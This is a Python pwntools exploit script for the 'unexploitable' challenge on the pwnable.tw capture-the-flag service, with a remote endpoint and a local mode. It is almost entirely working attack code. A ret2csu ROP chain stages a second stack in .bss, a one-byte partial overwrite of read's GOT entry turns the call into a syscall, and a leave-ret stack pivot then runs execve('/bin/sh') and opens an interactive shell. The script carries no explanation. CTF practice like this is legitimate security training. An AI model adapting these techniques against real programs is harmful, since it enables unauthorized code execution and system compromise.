from pwn import *

#context.log_level = 'debug'
elf = ELF('./unexploitable')

if len(sys.argv) > 1 and sys.argv[1] == '-r':
    p = remote("chall.pwnable.tw", 10403)
    libc = ELF('./libc_64.so.6')
else:
    p = process('./unexploitable')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# main
csu_init1 = 0x4005e6
csu_init2 = 0x4005d0
bss = 0x601028
poprbp = 0x00400512
leaveret = 0x0000000000400576

# read new stack data to bss
buf = "A"*24
buf += p64(csu_init1)
buf += p64(0xdeadbeef)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(elf.got['read']) #r12
buf += p64(0) #r13 to rdi
buf += p64(bss+128) #r14 to rsi
buf += p64(1000) #r15 to rdx
buf += p64(csu_init2)
buf += "A"*56
buf += p64(elf.functions['main'].address)

# new stack
stack = "/bin/sh\0"
stack += p64(csu_init1)
stack += p64(0xdeadbeef)
stack += p64(0) #rbx
stack += p64(1) #rbp
stack += p64(elf.got['read']) #r12
stack += p64(1) #r13 to rdi
stack += p64(bss) #r14 to rsi
stack += p64(59) #r15 to rdx
stack += p64(csu_init2)
stack += p64(0xdeadbeef)
stack += p64(0) #rbx
stack += p64(1) #rbp
stack += p64(elf.got['read']) #r12
stack += p64(bss+128) #r13 to rdi
stack += p64(0) #r14 to rsi
stack += p64(0) #r15 to rdx
stack += p64(csu_init2)

time.sleep(3)
p.sendline(buf)
time.sleep(0.1)
p.sendline(stack)

# overwrite 1 byte in read_got
buf = "A"*24
buf += p64(csu_init1)
buf += p64(0xdeadbeef)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(elf.got['read']) #r12
buf += p64(0) #r13 to rdi
buf += p64(elf.got['read']) #r14 to rsi
buf += p64(1) #r15 to rdx
buf += p64(csu_init2)
buf += "A"*56
buf += p64(poprbp) 
buf += p64(bss+128)
buf += p64(leaveret) # stack pivot

time.sleep(3)
p.sendline(buf)
time.sleep(0.1)
#p.send("\x5e") # for local environment
p.send("\x7e")

p.interactive()
